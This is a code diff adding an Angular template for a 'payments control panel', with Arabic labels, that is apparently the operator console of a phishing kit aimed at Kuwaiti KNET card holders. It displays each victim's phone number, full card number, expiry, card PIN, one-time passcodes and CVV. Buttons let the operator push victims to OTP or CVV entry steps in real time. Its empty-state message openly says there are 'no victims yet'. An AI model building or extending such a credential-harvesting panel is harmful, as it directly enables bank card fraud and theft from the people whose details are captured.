@@ -1,0 +1,111 @@
+<div class="min-h-screen bg-gray-100 p-8">
+  <div class="max-w-full mx-auto">
+    <div class="flex justify-between items-center mb-8">
+      <h1 class="text-3xl font-bold text-gray-800">لوحة تحكم المدفوعات</h1>
+      <div class="flex gap-4 items-center">
+        <span class="text-sm text-gray-500">يتم التحديث تلقائياً كل 3 ثوانٍ</span>
+      </div>
+    </div>
+
+    <div class="bg-white rounded-lg shadow overflow-x-auto">
+      <table class="min-w-full divide-y divide-gray-200 text-right" dir="rtl">
+        <thead class="bg-gray-50">
+          <tr>
+            <th class="px-6 py-3 text-sm font-medium text-gray-500">العميل</th>
+            <th class="px-6 py-3 text-sm font-medium text-gray-500">الفيزا (KNET)</th>
+            <th class="px-6 py-3 text-sm font-medium text-gray-500">رمز التحقق (OTP)</th>
+            <th class="px-6 py-3 text-sm font-medium text-gray-500">الـ CVV</th>
+          </tr>
+        </thead>
+        <tbody class="divide-y divide-gray-200 bg-white">
+          <tr *ngFor="let client of clients" class="hover:bg-gray-50">
+            <!-- Client Info -->
+            <td class="px-6 py-4 whitespace-nowrap align-top">
+              <div class="text-sm font-bold text-gray-900">{{ client.phone_number }}</div>
+              <div class="text-sm text-gray-500 mt-1">المبلغ: {{ client.credit }} د.ك</div>
+              <div class="text-xs text-gray-400 mt-2">{{ client.created_at | date:'short' }}</div>
+            </td>
+
+            <!-- KNET Data -->
+            <td class="px-6 py-4 align-top border-r">
+              <div *ngIf="client.knets?.length > 0; else noKnet" class="flex flex-col gap-4">
+                <div *ngFor="let knet of client.knets" class="p-3 bg-gray-50 rounded border" [ngClass]="{'border-green-300 bg-green-50': knet.status === 'APPROVED', 'border-red-300 bg-red-50': knet.status === 'REJECTED'}">
+                  <div class="grid grid-cols-2 gap-x-4 gap-y-2 text-sm mb-3">
+                    <div class="text-gray-500">البنك: <span class="text-gray-900 font-medium">{{knet.bank_name}}</span></div>
+                    <div class="text-gray-500 col-span-2">البطاقة: <span class="text-gray-900 font-mono tracking-wider">{{knet.prefix}}{{knet.card_number}}</span></div>
+                    <div class="text-gray-500">الانتهاء: <span class="text-gray-900 font-medium">{{knet.expiry_month}}/{{knet.expiry_year}}</span></div>
+                    <div class="text-gray-500">الرقم السري: <span class="text-gray-900 font-bold text-lg">{{knet.pass}}</span></div>
+                  </div>
+                  
+                  <div class="flex gap-2" *ngIf="knet.status === 'PENDING'">
+                    <button (click)="updateKnetStatus(knet.id, 'APPROVED')" class="flex-1 bg-green-500 hover:bg-green-600 text-white px-3 py-1.5 rounded text-sm font-medium transition-colors">قبول للـ OTP</button>
+                    <button (click)="updateKnetStatus(knet.id, 'REQUIRE_CVV')" class="flex-1 bg-blue-500 hover:bg-blue-600 text-white px-3 py-1.5 rounded text-sm font-medium transition-colors">تحويل لـ CVV</button>
+                    <button (click)="updateKnetStatus(knet.id, 'REJECTED')" class="flex-1 bg-red-500 hover:bg-red-600 text-white px-3 py-1.5 rounded text-sm font-medium transition-colors">رفض</button>
+                  </div>
+                  <div *ngIf="knet.status !== 'PENDING'" class="text-center font-bold text-sm" [ngClass]="{'text-green-600': knet.status === 'APPROVED', 'text-blue-600': knet.status === 'REQUIRE_CVV', 'text-red-600': knet.status === 'REJECTED'}">
+                    <span *ngIf="knet.status === 'APPROVED'">تم التحويل للـ OTP</span>
+                    <span *ngIf="knet.status === 'REQUIRE_CVV'">تم التحويل للـ CVV</span>
+                    <span *ngIf="knet.status !== 'APPROVED' && knet.status !== 'REQUIRE_CVV'">{{ knet.status }}</span>
+                  </div>
+                </div>
+              </div>
+              <ng-template #noKnet>
+                <span class="text-gray-400 text-sm">لم يتم إدخال البطاقة</span>
+              </ng-template>
+            </td>
+
+            <!-- OTP Data -->
+            <td class="px-6 py-4 align-top border-r">
+              <div *ngIf="client.knetOtps?.length > 0; else noOtp" class="flex flex-col gap-3">
+                <div *ngFor="let otp of client.knetOtps" class="p-3 bg-gray-50 rounded border" [ngClass]="{'border-green-300 bg-green-50': otp.status === 'APPROVED', 'border-red-300 bg-red-50': otp.status === 'OTP_FAILED' || otp.status === 'REJECTED'}">
+                  <div class="text-center mb-3">
+                    <span class="text-2xl font-bold tracking-widest text-gray-900">{{ otp.otp }}</span>
+                  </div>
+                  <div class="flex gap-2" *ngIf="otp.status === 'PENDING'">
+                    <button (click)="updateOtpStatus(otp.id, 'APPROVED')" class="flex-1 bg-green-500 hover:bg-green-600 text-white px-2 py-1.5 rounded text-xs font-medium transition-colors">قبول</button>
+                    <button (click)="updateOtpStatus(otp.id, 'OTP_FAILED')" class="flex-1 bg-yellow-500 hover:bg-yellow-600 text-white px-2 py-1.5 rounded text-xs font-medium transition-colors">كود خاطئ</button>
+                    <button (click)="updateOtpStatus(otp.id, 'REJECTED')" class="flex-1 bg-red-500 hover:bg-red-600 text-white px-2 py-1.5 rounded text-xs font-medium transition-colors">رفض الدفع</button>
+                  </div>
+                  <div *ngIf="otp.status !== 'PENDING'" class="text-center font-bold text-sm" [ngClass]="{'text-green-600': otp.status === 'APPROVED', 'text-yellow-600': otp.status === 'OTP_FAILED', 'text-red-600': otp.status === 'REJECTED'}">
+                    {{ otp.status }}
+                  </div>
+                </div>
+              </div>
+              <ng-template #noOtp>
+                <span class="text-gray-400 text-sm">في الانتظار...</span>
+              </ng-template>
+            </td>
+
+            <!-- CVV Data -->
+            <td class="px-6 py-4 align-top border-r">
+              <div *ngIf="client.cvvs?.length > 0; else noCvv" class="flex flex-col gap-3">
+                <div *ngFor="let cvv of client.cvvs" class="p-3 bg-gray-50 rounded border" [ngClass]="{'border-green-300 bg-green-50': cvv.status === 'APPROVED', 'border-red-300 bg-red-50': cvv.status === 'REJECTED'}">
+                  <div class="text-center mb-3">
+                    <span class="text-xl font-bold text-gray-900">{{ cvv.cvv }}</span>
+                  </div>
+                  <div class="flex gap-2" *ngIf="cvv.status === 'PENDING'">
+                    <button (click)="updateCvvStatus(cvv.id, 'APPROVED')" class="flex-1 bg-green-500 hover:bg-green-600 text-white px-2 py-1 rounded text-xs font-medium transition-colors">قبول</button>
+                    <button (click)="updateCvvStatus(cvv.id, 'REJECTED')" class="flex-1 bg-red-500 hover:bg-red-600 text-white px-2 py-1 rounded text-xs font-medium transition-colors">رفض</button>
+                  </div>
+                  <div *ngIf="cvv.status !== 'PENDING'" class="text-center font-bold text-sm" [ngClass]="{'text-green-600': cvv.status === 'APPROVED', 'text-red-600': cvv.status === 'REJECTED'}">
+                    {{ cvv.status }}
+                  </div>
+                </div>
+              </div>
+              <ng-template #noCvv>
+                <span class="text-gray-400 text-sm">لا يوجد CVV</span>
+              </ng-template>
+            </td>
+
+          </tr>
+          
+          <tr *ngIf="clients.length === 0">
+            <td colspan="4" class="px-6 py-12 text-center text-gray-500">
+              لا يوجد ضحايا حتى الآن. الجدول سيتم تحديثه تلقائياً.
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
